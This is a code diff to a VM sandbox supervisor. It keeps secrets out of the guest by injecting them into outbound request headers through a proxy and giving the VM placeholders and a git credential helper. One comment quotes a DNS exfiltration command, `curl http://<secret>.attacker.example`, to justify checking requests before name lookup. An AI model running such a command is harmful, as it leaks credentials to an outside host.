@@ -1,7 +1,10 @@
 // p2's sandbox program on a host environment: one long-lived Gondolin VM per sandbox, held by a supervisor process
 // (`serve`), and the commands p2 runs over SSH (`daemon`, `start`, `status`, `stop`, `reset`, `forget`). `daemon` starts the supervisor
 // when the sandbox is not running, then runs the pi-env daemon in the VM with stdin and stdout passed through, so p2
-// talks to the daemon in the VM as it does to one on any other machine. Started by p2-sandbox.sh.
+// talks to the daemon in the VM as it does to one on any other machine. Started by p2-sandbox.sh. Secrets: the
+// configuration names them (with their hosts), `start` reads their values as JSON on stdin and hands them to the
+// supervisor in its environment; the supervisor's HTTP proxy puts them into outbound request headers for their hosts,
+// while the VM only sees placeholders.
 
 import { execFileSync, spawn } from "node:child_process";
 import { createHash } from "node:crypto";
@@ -64,7 +67,8 @@ async function main(args) {
 			return runDaemon(name, parseConfig(config), binary, daemonArgs);
 		}
 		case "start": {
-			await ensureRunning(name, parseConfig(rest[0]));
+			const config = parseConfig(rest[0]);
+			await ensureRunning(name, config, config.secrets.length ? await readSecretValues(config) : {});
 			return print(await request(name, { op: "status" }));
 		}
 		case "status":
@@ -100,7 +104,22 @@ function print(value) {
 	process.stdout.write(`${JSON.stringify(value)}\n`);
 }
 
-/** The sandbox configuration p2 passes as base64 JSON: image, folders, allowed hosts, resources. */
+/** Secret values from stdin (`start`): a JSON object by secret name, one for each secret the configuration names. */
+async function readSecretValues(config) {
+	let text = "";
+	for await (const chunk of process.stdin) text += chunk;
+	let values;
+	try {
+		values = JSON.parse(text || "{}");
+	} catch {
+		fail("Invalid secret values on stdin");
+	}
+	for (const secret of config.secrets)
+		if (typeof values?.[secret.name] !== "string") fail(`No value for secret ${secret.name}`);
+	return values;
+}
+
+/** The sandbox configuration p2 passes as base64 JSON: image, folders, allowed hosts, resources, secrets (no values). */
 function parseConfig(text) {
 	let config;
 	try {
@@ -116,6 +135,14 @@ function parseConfig(text) {
 		cpus: Number.isInteger(config.cpus) ? config.cpus : undefined,
 		memoryMb: Number.isInteger(config.memoryMb) ? config.memoryMb : undefined,
 		diskGb: Number.isInteger(config.diskGb) ? config.diskGb : undefined,
+		secrets: Array.isArray(config.secrets)
+			? config.secrets.map((secret) => ({
+					name: String(secret.name),
+					hosts: Array.isArray(secret.hosts) ? secret.hosts.map(String) : [],
+					aliases: Array.isArray(secret.aliases) ? secret.aliases.map(String) : [],
+					gitHosts: Array.isArray(secret.gitHosts) ? secret.gitHosts.map(String) : [],
+				}))
+			: [],
 		revision: createHash("sha256").update(text).digest("hex").slice(0, 16),
 		raw: text,
 	};
@@ -208,9 +235,12 @@ async function request(name, message) {
  * clients from starting two supervisors; the one that waits sees the other's socket, and takes over a lock whose owner
  * died. A start that times out stops its supervisor, so none is left booting without a lock.
  */
-async function ensureRunning(name, config) {
+async function ensureRunning(name, config, secrets) {
 	const existing = await tryConnect(name);
 	if (existing) return existing.destroy();
+	// Only `start` has the values: a supervisor started without them would run without its secrets.
+	if (config.secrets.length && secrets === undefined)
+		throw new Error(`Sandbox ${name} has secrets: start it with "start" first`);
 	const dir = runDir(name);
 	mkdirSync(dir, { recursive: true, mode: 0o700 });
 	const lock = join(dir, "start.lock");
@@ -244,6 +274,8 @@ async function ensureRunning(name, config) {
 		const child = spawn(process.execPath, [self, "serve", name, config.raw], {
 			detached: true,
 			stdio: ["ignore", out, out],
+			// The values in the supervisor's environment (owner-only in /proc), never on its command line.
+			env: { ...process.env, P2_SANDBOX_SECRETS: JSON.stringify(secrets ?? {}) },
 		});
 		closeSync(out);
 		let exited = false;
@@ -313,15 +345,23 @@ async function serve(name, config) {
 		mounts[String(mount.guest)] = mount.readonly ? new ReadonlyProvider(real) : real;
 	}
 	const disk = await ensureDisk(name, config);
+	const values = JSON.parse(process.env.P2_SANDBOX_SECRETS || "{}");
+	delete process.env.P2_SANDBOX_SECRETS;
+	const secrets = {};
+	for (const secret of config.secrets) {
+		if (typeof values[secret.name] !== "string") throw new Error(`No value for secret ${secret.name}`);
+		secrets[secret.name] = { hosts: secret.hosts, value: values[secret.name] };
+	}
 	const { httpHooks, env } = createHttpHooks({
 		allowedHosts: config.allowHosts,
+		secrets,
 		// Gondolin checks `allowedHosts` only after resolving the name on the host, which would leak any name the guest
 		// asks for to DNS (`curl http://<secret>.attacker.example`); the request policy runs before that lookup.
 		isRequestAllowed: (request) => allowedHost(new URL(request.url).hostname, config.allowHosts),
 	});
 	const vm = await VM.create({
 		httpHooks,
-		env: { ...GUEST_ENV, ...env },
+		env: { ...GUEST_ENV, ...env, ...secretHelpers(config.secrets, env) },
 		// Gondolin's own mount point, out of the way of the folders (its default is /data).
 		vfs: { mounts, fuseMount: GUEST_VFS },
 		...(config.cpus === undefined ? {} : { cpus: config.cpus }),
@@ -411,6 +451,33 @@ async function serve(name, config) {
 	});
 	rmSync(socketPath, { force: true });
 	server.listen(socketPath, () => console.log(`sandbox ${name} running (pid ${process.pid})`));
+}
+
+/**
+ * More variables for the secrets' placeholders: aliases (`GH_TOKEN` beside `GITHUB_TOKEN`) and a git credential helper
+ * per git host, through `GIT_CONFIG_*` (git 2.31 or newer), so nothing is written in the VM.
+ */
+function secretHelpers(secrets, env) {
+	const extra = {};
+	const git = [];
+	for (const secret of secrets) {
+		const placeholder = env[secret.name];
+		if (placeholder === undefined) continue;
+		for (const alias of secret.aliases) extra[alias] = placeholder;
+		for (const host of secret.gitHosts)
+			git.push([
+				`credential.https://${host}.helper`,
+				`!f() { test "$1" = get && echo username=x-access-token && echo "password=$${secret.name}"; }; f`,
+			]);
+	}
+	if (git.length) {
+		extra.GIT_CONFIG_COUNT = String(git.length);
+		git.forEach(([key, value], index) => {
+			extra[`GIT_CONFIG_KEY_${index}`] = key;
+			extra[`GIT_CONFIG_VALUE_${index}`] = value;
+		});
+	}
+	return extra;
 }
 
 /** Gondolin's host pattern rules: case-insensitive, `*` alone matches any host, `*` inside a pattern any substring. */
